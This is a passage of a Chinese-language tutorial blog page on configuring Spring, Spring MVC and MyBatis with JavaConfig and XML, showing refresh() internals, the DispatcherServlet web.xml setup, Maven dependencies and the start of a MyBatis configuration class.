data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token function\">initApplicationEventMulticaster</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token comment\">// 模板方法</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token function\">onRefresh</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token comment\">// 注册监听器</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token function\">registerListeners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token comment\">// 初始化所有未初始化的非懒加载的单例 Bean</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token function\">finishBeanFactoryInitialization</span><span class=\"token punctuation\">(</span>beanFactory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token comment\">// 发布事件通知</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token function\">finishRefresh</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">BeansException</span> var5<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>logger<span class=\"token punctuation\">.</span><span class=\"token function\">isWarnEnabled</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>logger<span class=\"token punctuation\">.</span><span class=\"token function\">warn</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Exception encountered during context initialization - cancelling refresh attempt: \"</span> <span class=\"token operator\">+</span> var5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">destroyBeans</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">cancelRefresh</span><span class=\"token punctuation\">(</span>var5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            <span class=\"token keyword\">throw</span> var5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>完成 bean 的加载。</p>\n<h2 id=\"javaconfig方式配置applicationconfig\"><a class=\"anchor\" href=\"#javaconfig方式配置applicationconfig\">#</a> JavaConfig 方式配置 ApplicationConfig</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Configuration</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token annotation punctuation\">@ComponentScan</span><span class=\"token punctuation\">(</span>basePackages <span class=\"token operator\">=</span> <span class=\"token string\">\"com.sk.day31\"</span><span class=\"token punctuation\">,</span> excludeFilters <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token annotation punctuation\">@ComponentScan.Filter</span><span class=\"token punctuation\">(</span>type <span class=\"token operator\">=</span> <span class=\"token class-name\">FilterType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ANNOTATION</span><span class=\"token punctuation\">,</span> classes <span class=\"token operator\">=</span> <span class=\"token class-name\">Controller</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ApplicationConfig</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>效果类似</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">context:</span>component-scan</span> <span class=\"token attr-name\">base-package</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>com.sk.day31<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">context:</span>exclude-filter</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>annotation<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">expression</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>org.springframework.stereotype.Controller<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span>--></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span><span class=\"token namespace\">context:</span>component-scan</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h1 id=\"配置spring-webmvc\"><a class=\"anchor\" href=\"#配置spring-webmvc\">#</a> 配置 spring-webmvc</h1>\n<p>在 web.xml 中配置：</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">></span></span>dispatcherServlet<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-class</span><span class=\"token punctuation\">></span></span>org.springframework.web.servlet.DispatcherServlet<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-class</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>init-param</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>param-name</span><span class=\"token punctuation\">></span></span>contextClass<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>param-name</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>param-value</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token comment\">&lt;!-- 使用注解实现类 --></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      org.springframework.web.context.support.AnnotationConfigWebApplicationContext</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>param-value</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>init-param</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>init-param</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>param-name</span><span class=\"token punctuation\">></span></span>contextConfigLocation<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>param-name</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>param-value</span><span class=\"token punctuation\">></span></span>com.sk.day31.config.SpringMvcConfig<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>param-value</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>init-param</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>load-on-startup</span><span class=\"token punctuation\">></span></span>1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>load-on-startup</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-mapping</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">></span></span>dispatcherServlet<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>url-pattern</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>url-pattern</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-mapping</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Configuration</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token annotation punctuation\">@ComponentScan</span><span class=\"token punctuation\">(</span>basePackages <span class=\"token operator\">=</span> <span class=\"token string\">\"com.sk.day31.controller\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token annotation punctuation\">@EnableWebMvc</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">SpringMvcConfig</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">WebMvcConfigurer</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">addResourceHandlers</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ResourceHandlerRegistry</span> registry<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        registry<span class=\"token punctuation\">.</span><span class=\"token function\">addResourceHandler</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/resources/**\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">addResourceLocations</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"classpath:/static/\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">setCacheControl</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">CacheControl</span><span class=\"token punctuation\">.</span><span class=\"token function\">maxAge</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Duration</span><span class=\"token punctuation\">.</span><span class=\"token function\">ofDays</span><span class=\"token punctuation\">(</span><span class=\"token number\">365</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">configureDefaultServletHandling</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DefaultServletHandlerConfigurer</span> configurer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        configurer<span class=\"token punctuation\">.</span><span class=\"token function\">enable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>@EnableWebMvc 效果等于<span class=\"exturl\" data-url=\"bXZjOmFubm90YXRpb24tZHJpdmVuLw==\"> mvc:annotation-driven/</span>。</p>\n<p>configureDefaultServletHandling 方法作用等于<span class=\"exturl\" data-url=\"bXZjOmRlZmF1bHQtc2VydmxldC1oYW5kbGVyLw==\"> mvc:default-servlet-handler/</span></p>\n<h1 id=\"配置mybatis\"><a class=\"anchor\" href=\"#配置mybatis\">#</a> 配置 mybatis</h1>\n<h2 id=\"添加依赖\"><a class=\"anchor\" href=\"#添加依赖\">#</a> 添加依赖</h2>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>org.springframework<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>spring-jdbc<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>$&#123;spring.version&#125;<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>mysql<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>mysql-connector-java<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>8.0.28<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>com.alibaba<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>druid<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>1.1.22<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>org.mybatis<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>mybatis-spring<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>2.0.7<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>org.mybatis<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>mybatis<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>3.5.9<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>spring-jdbc 必须添加，不然会报错 java.lang.NoClassDefFoundError: org/springframework/dao/support/DaoSupport。</p>\n<h2 id=\"配置类\"><a class=\"anchor\" href=\"#配置类\">#</a> 配置类</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Configuration</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token annotation punctuation\">@PropertySource</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"classpath:druid.properties\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token annotation punctuation\">@MapperScan</span><span class=\"token punctuation\">(</span>basePackages <span class=\"token operator\">=</span> <span class=\"token string\">\"com.sk.day31.mapper\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MybatisConfig</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;jdbc.driver&#125;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> driver<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;jdbc.url&#125;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> url<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;jdbc.username&#125;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">private</span> 